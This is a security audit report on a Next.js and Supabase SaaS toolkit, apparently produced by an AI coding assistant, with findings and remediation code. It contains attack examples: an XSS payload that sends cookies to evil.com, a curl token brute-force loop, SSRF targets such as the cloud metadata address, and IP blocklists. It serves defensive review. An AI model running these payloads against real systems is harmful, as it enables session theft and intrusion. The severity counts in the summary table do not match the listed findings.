# Security Review Report: Agency Toolkit

**Date:** 2026-01-19
**Reviewer:** Claude Code (Automated Security Audit)
**Scope:** Multi-tenant SaaS application - Supabase, Next.js, JavaScript embeds, TrustSignal widget

---

## Executive Summary

Overall, the application has **solid foundational security** with proper Clerk integration, good input validation patterns (Zod), and HTML sanitization. However, there are **critical vulnerabilities** that need addressing before production deployment, primarily around:

1. **XSS in embed scripts** (innerHTML usage)
2. **Missing rate limiting** on public endpoints
3. **SSRF vulnerability** in color extraction
4. **Overly permissive RLS policies**

---

## Critical Issues (Fix Before Launch)

### 1. XSS Vulnerabilities in Embed Scripts

**Severity:** CRITICAL
**CVSS:** 9.8

| File | Line | Issue |
|------|------|-------|
| `app/ts.js/route.ts` | 442, 211 | `innerHTML` with unsanitized user data (event names, cities, actions) |
| `app/embed.js/route.ts` | 930-942 | Image URL and text injection via `innerHTML` |
| `app/embed.js/route.ts` | 428-440 | Event data rendered without escaping |

**Attack vector:** If TrustSignal event data contains `<img src=x onerror="malicious()">`, it executes on customer websites.

**Example payload:**
```javascript
event.first_name = "John<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>";
```

**Fix needed:** Create `escapeHtml()` function and apply to all user-controlled data before DOM insertion:
```javascript
function escapeHtml(text) {
  const map = {
    '&': '&amp;', '<': '&lt;', '>': '&gt;',
    '"': '&quot;', "'": '&#039;'
  };
  return String(text).replace(/[&<>"']/g, m => map[m]);
}
```

---

### 2. Missing Rate Limiting

**Severity:** CRITICAL
**CVSS:** 8.6

| Endpoint | Risk |
|----------|------|
| `/api/config?key=` | Agency token brute-force |
| `/api/trustsignal/config` | Widget token enumeration |
| `/api/trustsignal/capture` | Event flooding |

**Attack:** Attacker can enumerate all `rp_*` tokens by trying millions of combinations:
```bash
for i in {1..1000000}; do
  curl "https://api.example.com/api/config?key=rp_$(printf '%016x' $i)"
done
```

**Fix needed:** Implement rate limiting (suggest `@vercel/kv` or `upstash/ratelimit`):
- `/api/config`: 100 req/min per IP
- `/api/trustsignal/capture`: 500 req/hour per widget

---

### 3. SSRF Vulnerability in Color Extraction

**Severity:** CRITICAL
**CVSS:** 9.1

**File:** `app/(dashboard)/colors/_actions/color-actions.ts:326-420`

```typescript
const response = await fetch(parsedUrl.toString()); // User-controlled URL!
```

**Attack:** User submits internal URLs:
- `http://169.254.169.254/latest/meta-data/` - AWS metadata
- `http://localhost:3000/admin` - Internal APIs
- `http://127.0.0.1:5432` - Database port scanning

**Fix needed:**
```typescript
const BLOCKED_HOSTS = ['localhost', '127.0.0.1', '0.0.0.0'];
const BLOCKED_IP_RANGES = [
  /^10\./,           // 10.0.0.0/8
  /^172\.(1[6-9]|2[0-9]|3[0-1])\./,  // 172.16.0.0/12
  /^192\.168\./,     // 192.168.0.0/16
  /^169\.254\./,     // Link-local
];

function isBlockedUrl(url: URL): boolean {
  const hostname = url.hostname.toLowerCase();
  if (BLOCKED_HOSTS.includes(hostname)) return true;
  // Check IP ranges...
  return false;
}
```

---

### 4. Overly Permissive RLS Policies

**Severity:** HIGH
**CVSS:** 7.5

**File:** `supabase/schema.sql:305-323`

```sql
CREATE POLICY "Public can read agency config by token" ON agencies
  FOR SELECT
  USING (true);  -- Anyone can read ALL agencies!
```

**Risk:** Direct Supabase queries can enumerate all agencies, customers, and templates via the anon key.

**Fix options:**
1. Change policies to validate token in WHERE clause
2. Rely on API layer with rate limiting (current approach, but needs rate limiting added)
3. Remove public RLS policies and require all access through authenticated API

---

## High Priority Issues

### 5. Missing PostMessage Origin Validation

**Severity:** HIGH
**CVSS:** 8.2

| File | Line |
|------|------|
| `app/embed.js/route.ts` | 1853 (`window.opener.postMessage(message, '*')`) |
| `app/(dashboard)/tours/[id]/_hooks/use-element-selector.ts` | 152-165 (no `event.origin` check) |

**Attack:** Malicious site can send forged element selection data.

**Fix:**
```typescript
const handleMessage = (event: MessageEvent) => {
  if (event.origin !== 'https://toolkit.example.com') return;
  // ... process message
};
```

---

### 6. Token Entropy Too Low

**Severity:** HIGH
**CVSS:** 7.4

**File:** `lib/tokens.ts:3-18`

Current: 8 bytes (64 bits) - theoretically brute-forceable.

**Fix:** Increase to 32 bytes (256 bits):
```typescript
export function generateAgencyToken(): string {
  const random = randomBytes(32).toString('hex');
  return `rp_${random}`;
}
```

---

### 7. Missing Input Validation on PATCH Endpoints

**Severity:** HIGH
**CVSS:** 7.1

**File:** `app/api/customers/[id]/route.ts:53-65`

The `settings` JSONB field accepts arbitrary data without validation:
```typescript
.update({
  settings: body.settings,  // No validation!
})
```

**Fix:** Add Zod schema validation before database updates.

---

### 8. Debug Endpoint Exposed

**Severity:** HIGH
**CVSS:** 6.5

**File:** `app/api/debug-auth/route.ts`

Leaks Clerk user IDs and full agency records to any authenticated user.

**Fix:**
```typescript
if (process.env.NODE_ENV !== 'development') {
  return new Response('Not Found', { status: 404 });
}
```

---

### 9. Error Message Leakage

**Severity:** MEDIUM
**CVSS:** 5.3

Multiple API routes return `error.message` directly, exposing database schema details.

**Affected files:**
- `app/api/customers/route.ts:21, 74`
- `app/api/customers/[id]/route.ts:29, 71`
- `app/api/tours/[id]/route.ts:43`
- `app/(dashboard)/tours/_actions/tour-actions.ts:88, 146, 224, 280`

**Example leakage:**
```
"duplicate key value violates unique constraint 'agencies_token_key'"
```

**Fix:** Return generic errors, log details server-side:
```typescript
if (error) {
  console.error('Database error:', error);
  return NextResponse.json(
    { error: 'Operation failed. Please try again.' },
    { status: 500 }
  );
}
```

---

### 10. Race Conditions in Default Preset Updates

**Severity:** MEDIUM
**CVSS:** 5.9

Multiple actions use non-atomic "unset all then insert new" pattern for default presets.

**Affected:**
- `colors/_actions/color-actions.ts:114-120`
- `menu/_actions/menu-actions.ts:141-146`
- `login/_actions/login-actions.ts:82-88`

**Fix:** Use database constraint or wrap in transaction.

---

## Medium Priority Issues

| Issue | File | Line | CVSS |
|-------|------|------|------|
| No response size limit on fetch | `colors/_actions/color-actions.ts` | 341-352 | 5.3 |
| Custom CSS injection | `ts.js/route.ts` | 396-402 | 6.1 |
| Missing security headers | `next.config.ts` | - | 5.0 |
| File upload MIME spoofing | `app/api/upload/route.ts` | 9-81 | 5.5 |
| No audit logging | All state-changing actions | - | 4.0 |
| Webhook replay risk | `webhooks/clerk/route.ts` | 8-39 | 5.0 |
| Session storage exposure | `embed.js/route.ts` | 146-152 | 4.5 |
| Weak object comparison | `colors/_actions/color-actions.ts` | 232-235 | 3.5 |

### Missing Security Headers

Add to `next.config.ts`:
```typescript
headers: [
  {
    source: '/:path*',
    headers: [
      { key: 'X-Content-Type-Options', value: 'nosniff' },
      { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' },
      { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
      { key: 'Permissions-Policy', value: 'geolocation=(), microphone=(), camera=()' },
    ],
  },
]
```

---

## What's Working Well

- **Clerk auth integration** - Properly using `auth()` server-side
- **Supabase client separation** - Admin client only server-side, never exposed to client
- **Zod validation** - Used consistently in tour creation, event capture
- **HTML sanitization** - `sanitizeHTML()` from `lib/security/sanitize.ts` applied to tour content
- **URL validation** - `lib/security/url-validator.ts` prevents dangerous protocols with ReDoS protection
- **CSS selector validation** - `lib/security/selector-validator.ts` blocks script/style tags
- **Ownership checks** - Most queries include `.eq('agency_id', agency.id)`
- **Webhook verification** - Clerk webhooks properly verified with Svix

---

## Remediation Priority

### Phase 1 - Before Any External Testing
| Priority | Issue | Effort |
|----------|-------|--------|
| P1 | Fix XSS in `ts.js` and `embed.js` | Medium |
| P1 | Add rate limiting to public endpoints | Medium |
| P1 | Fix SSRF in color extraction | Low |
| P1 | Disable debug endpoint in production | Low |

### Phase 2 - Before Production Launch
| Priority | Issue | Effort |
|----------|-------|--------|
| P2 | Increase token entropy | Low |
| P2 | Add PostMessage origin validation | Low |
| P2 | Add input validation to PATCH endpoints | Medium |
| P2 | Fix error message leakage | Low |
| P2 | Add security headers | Low |

### Phase 3 - Post-Launch Hardening
| Priority | Issue | Effort |
|----------|-------|--------|
| P3 | Add audit logging | High |
| P3 | Implement token rotation mechanism | Medium |
| P3 | Fix race conditions with DB constraints | Medium |
| P3 | Validate file content (magic bytes) | Medium |
| P3 | Add webhook timestamp freshness check | Low |

---

## Testing Recommendations

```bash
# Test 1: Verify RLS doesn't leak data
curl -H "apikey: $ANON_KEY" \
  "https://project.supabase.co/rest/v1/agencies?select=*"
# Should return 0 rows or 403 error

# Test 2: Verify rate limiting works
for i in {1..200}; do
  curl "https://app.com/api/config?key=rp_invalid_$i" &
done
# Should see 429 responses after limit

# Test 3: Verify XSS is blocked
# Create event with name: <script>alert('xss')</script>
# Verify it renders as escaped text, not executed

# Test 4: Verify SSRF is blocked
# Try extracting colors from http://169.254.169.254/
# Should be rejected before fetch
```

---

## Summary Table

| Severity | Count | Status |
|----------|-------|--------|
| CRITICAL | 4 | Needs immediate fix |
| HIGH | 6 | Fix before production |
| MEDIUM | 8 | Fix post-launch |
| LOW | 2 | Nice to have |

**Total Issues:** 20

---

## Next Steps

1. Create backlog items for Phase 1 fixes
2. Implement fixes in priority order
3. Re-run security review after fixes
4. Consider external penetration testing before GA launch
